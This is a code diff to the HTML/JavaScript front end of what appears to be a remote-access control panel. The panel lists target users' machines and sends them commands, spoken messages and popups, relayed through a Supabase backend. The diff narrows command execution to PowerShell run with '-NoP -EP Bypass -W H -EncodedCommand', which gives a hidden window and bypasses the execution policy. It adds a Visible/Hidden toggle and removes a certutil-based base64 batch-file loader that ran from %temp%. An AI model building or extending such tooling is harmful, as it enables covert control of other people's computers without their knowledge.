@@ -1982,7 +1982,7 @@
     <div class="popup-overlay" id="popup-overlay">
         <div class="popup-box">
             <div class="popup-header">
-                <span class="popup-title" id="popup-mode-label">COMMAND</span>
+                <span class="popup-title" id="popup-mode-label">POWERSHELL</span>
                 <span class="popup-target" id="popup-target-label">TARGET_USER</span>
             </div>
             <div class="textarea-wrap" id="textarea-wrap">
@@ -1996,7 +1996,7 @@
                     </button>
                 </span>
             </div>
-            <input type="file" id="file-upload" accept=".bat,.cmd,.ps1,.txt" style="display:none;">
+            <input type="file" id="file-upload" accept=".ps1,.txt" style="display:none;">
             <div id="vis-section" style="display:none;" class="option-row">
                 <button class="opt-btn" id="vis-true" tabindex="-1">Visible</button>
                 <button class="opt-btn" id="vis-false" tabindex="-1">Hidden</button>
@@ -2031,20 +2031,14 @@
             </details>
             <details id="shell-section" class="collapsible-section" style="display:none;">
                 <summary class="collapsible-summary">
-                    <span>Command Tools</span>
+                    <span>PowerShell Tools</span>
                     <span class="collapsible-meta collapsible-meta-shell" id="shell-summary-meta">
-                        <span class="collapsible-meta-pill" id="shell-summary-cmd">CMD</span>
                         <span class="collapsible-meta-pill" id="shell-summary-ps">PS1</span>
                         <span class="collapsible-meta-pill" id="shell-summary-upload">UPLOAD</span>
-                        <span class="collapsible-meta-pill" id="shell-summary-pause">PAUSE</span>
                     </span>
                 </summary>
                 <div class="collapsible-body">
-                    <button class="opt-btn" id="shell-cmd" tabindex="-1">CMD</button>
-                    <button class="opt-btn" id="shell-ps" tabindex="-1">PS1</button>
                     <button class="opt-btn" id="upload-btn" tabindex="-1">Upload</button>
-                    <span class="shell-sep" aria-hidden="true">|</span>
-                    <button class="opt-btn" id="cmd-pause" tabindex="-1">Pause</button>
                 </div>
             </details>
             <div class="popup-footer">
@@ -2687,8 +2681,7 @@
                 url: localStorage.getItem('supa_url'),
                 apiKey: localStorage.getItem('supa_key'),
                 popupMode: null, popupUser: null,
-                selectedVoice: 'David', selectedVis: true, selectedShell: 'cmd',
-                pause: false, activeUsername: null, interactionMode: null,
+                selectedVoice: 'David', selectedVis: true, activeUsername: null, interactionMode: null,
                 lastRenderSignature: null, fetchInFlight: false, isConnected: false,
                 hintUsername: null, isRendering: false, popupExampleText: '',
                 cmdLoadedFromUpload: false, selectedSpkVolume: 100, selectedSpkSpeed: 0,
@@ -2857,7 +2850,7 @@
                     </div>
                 </div>
                 <div class="card-actions">
-                    <button class="card-btn primary ${alive && canInteract ? '' : 'disabled'}" data-action="cmd" ${alive && canInteract ? '' : disabledAttrs}>
+                    <button class="card-btn primary ${alive && canInteract ? '' : 'disabled'}" data-action="ps" ${alive && canInteract ? '' : disabledAttrs}>
                         CMD ${showPrimary ? '<span class="btn-hint">C</span>' : ''}
                     </button>
                     <button class="card-btn ${alive && canInteract ? '' : 'disabled'}" data-action="speak" ${alive && canInteract ? '' : disabledAttrs}>
@@ -2960,9 +2953,7 @@
             }
             function updatePlaceholder() {
                 const ta = $('popup-input'), m = runState.popupMode;
-                if (m === 'cmd') ta.placeholder = runState.selectedShell === 'ps'
-                    ? "Get-Process | Where-Object { $_.CPU -gt 100 }"
-                    : 'echo hello\nping 127.0.0.1 -n 3';
+                if (m === 'cmd') ta.placeholder = "Get-Process | Where-Object { $_.CPU -gt 100 }";
                 else if (m === 'speak') ta.placeholder = `Type speech text i.e. "${runState.popupExampleText || 'Audio test, all systems ready.'}"`;
                 else if (m === 'popup_msg') ta.placeholder = `Type popup note i.e. "${runState.popupExampleText || 'Reminder: save your work now.'}"`;
             }
@@ -2978,15 +2969,10 @@
                 setActive('voice-zira', runState.selectedVoice === 'Zira');
                 setActive('vis-true', runState.selectedVis);
                 setActive('vis-false', !runState.selectedVis);
-                setActive('shell-cmd', runState.selectedShell === 'cmd');
-                setActive('shell-ps', runState.selectedShell === 'ps');
-                setActive('cmd-pause', runState.pause);
 
                 const setPill = (id, cond) => $(id).className = 'collapsible-meta-pill' + (cond ? ' active' : '');
-                setPill('shell-summary-cmd', runState.selectedShell === 'cmd');
-                setPill('shell-summary-ps', runState.selectedShell === 'ps');
+                setPill('shell-summary-ps', true);
                 setPill('shell-summary-upload', runState.cmdLoadedFromUpload);
-                setPill('shell-summary-pause', runState.pause);
 
                 const vol = $('spk-volume'), spd = $('spk-speed');
                 if (vol) vol.value = String(runState.selectedSpkVolume);
@@ -3021,7 +3007,7 @@
                 $('voice-section').style.display = isSpk ? 'flex' : 'none';
                 $('spk-controls').style.display = isSpk ? 'block' : 'none';
                 $('shell-section').open = false; $('spk-controls').open = false;
-                $('popup-mode-label').textContent = isCmd ? 'Execute Command' : isSpk ? 'Voice Message' : 'Message Box';
+                $('popup-mode-label').textContent = isCmd ? 'Execute PowerShell' : isSpk ? 'Voice Message' : 'Message Box';
                 updateOptionsUI();
                 setTimeout(() => { $('popup-input').focus(); syncTabHint(); }, 50);
             }
@@ -3049,24 +3035,6 @@
                 }
                 return `powershell -NoP -EP Bypass -W ${hidden ? 'H' : 'Normal'} -EncodedCommand ${bytesToBase64(utf16)}`;
             }
-            function normalizePsPause(val) { return val.replace(/^\s*pause\s*$/gim, "Read-Host 'Press Enter to continue'"); }
-            function applyCommandPause(val) {
-                const input = val.trim(); if (!runState.pause) return input;
-                if (runState.selectedShell === 'ps') {
-                    const norm = normalizePsPause(input);
-                    return norm ? `${norm}\nRead-Host 'Press Enter to continue'` : "Read-Host 'Press Enter to continue'";
-                }
-                return input;
-            }
-            function wrapCmd(val, pause = false) {
-                if (!val.includes('\n')) {
-                    return pause ? `cmd /k "${val}"` : val;
-                }
-                const b64 = bytesToBase64(new TextEncoder().encode(val));
-                const runner = pause ? 'cmd /k' : 'cmd /c';
-                return `${runner} "echo ${b64}>%temp%\\r.b64 && certutil -decode %temp%\\r.b64 %temp%\\r.bat >nul && cmd /c %temp%\\r.bat && del %temp%\\r.b64 %temp%\\r.bat"`;
-            }
-
             // ── Send / fetch ──
             async function doSendPopup() {
                 const user = runState.popupUser, mode = runState.popupMode;
@@ -3076,13 +3044,7 @@
 
                 let rawCmd = '';
                 if (mode === 'cmd') {
-                    const cmdInput = applyCommandPause(val);
-                    if (cmdInput) {
-                        const psInput = runState.selectedShell === 'ps' ? normalizePsPause(cmdInput) : cmdInput;
-                        rawCmd = runState.selectedShell === 'ps'
-                            ? wrapPowershell(psInput, !runState.selectedVis)
-                            : wrapCmd(psInput, runState.pause && runState.selectedVis);
-                    }
+                    if (val) rawCmd = wrapPowershell(val, !runState.selectedVis);
                 } else if (val) {
                     const msg = formatPSString(val);
                     if (mode === 'speak') {
@@ -3136,10 +3098,9 @@
                 } catch (e) { console.error(e); } finally { runState.fetchInFlight = false; }
             }
 
-            // ── Visibility / pause ──
+            // ── Visibility ──
             async function setPopupVisibility(nextVisible) {
                 if (runState.popupMode !== 'cmd' || !runState.popupUser) return;
-                if (!nextVisible && runState.pause) { flashConflict('cmd-pause'); return; }
                 runState.selectedVis = !!nextVisible;
                 runState.popupUser.visible = runState.selectedVis;
                 const idx = runState.rows.findIndex(r => r.username === runState.popupUser.username);
@@ -3153,11 +3114,6 @@
                     });
                 } catch (e) { console.error('Visibility sync error', e); }
             }
-            function togglePauseOption() {
-                if (!runState.selectedVis) { flashConflict('vis-false'); return; }
-                runState.pause = !runState.pause; updateOptionsUI();
-            }
-
             // ── Tab / autofill ──
             function syncTabHint() {
                 const ta = $('popup-input'), wrap = $('textarea-wrap');
@@ -3254,7 +3210,7 @@
                     const username = card.dataset.username; if (!username) return;
                     const user = getRenderableRows().find(u => u.username === username); if (!user) return;
                     const action = btn.dataset.action; if (!action) return;
-                    if (action === 'cmd') openPopup('cmd', user);
+                    if (action === 'ps') openPopup('cmd', user);
                     if (action === 'speak') openPopup('speak', user);
                     if (action === 'popup_msg') openPopup('popup_msg', user);
                     if (action === 'output') doViewOutput(user);
@@ -3267,16 +3223,10 @@
                 $('spk-speed').oninput = e => { runState.selectedSpkSpeed = Number(e.target.value); updateOptionsUI(); };
                 $('vis-true').onclick = () => setPopupVisibility(true);
                 $('vis-false').onclick = () => setPopupVisibility(false);
-                $('shell-cmd').onclick = () => { runState.selectedShell = 'cmd'; updateOptionsUI(); };
-                $('shell-ps').onclick = () => { runState.selectedShell = 'ps'; updateOptionsUI(); };
-                $('cmd-pause').onclick = togglePauseOption;
                 $('upload-btn').onclick = () => $('file-upload').click();
 
                 $('file-upload').onchange = e => {
                     const file = e.target.files[0]; if (!file) return;
-                    const ext = file.name.split('.').pop().toLowerCase();
-                    if (ext === 'ps1') { runState.selectedShell = 'ps'; updateOptionsUI(); }
-                    else if (ext === 'bat' || ext === 'cmd') { runState.selectedShell = 'cmd'; updateOptionsUI(); }
                     const reader = new FileReader();
                     reader.onload = ev => {
                         $('popup-input').value = ev.target.result;
@@ -3322,7 +3272,7 @@
                     if (!u) return;
                     const alive = getStatus(u) === 'green';
                     const key = e.key.toLowerCase();
-                    if (key === 'c' && alive) openPopup('cmd', u);
+                    if (key === 'p' && alive) openPopup('cmd', u);
                     if (key === 's' && alive) { runState.selectedVoice = e.shiftKey ? 'Zira' : 'David'; openPopup('speak', u); }
                     if (key === 'a' && alive) openPopup('popup_msg', u);
                     if (key === 'v') doViewOutput(u);
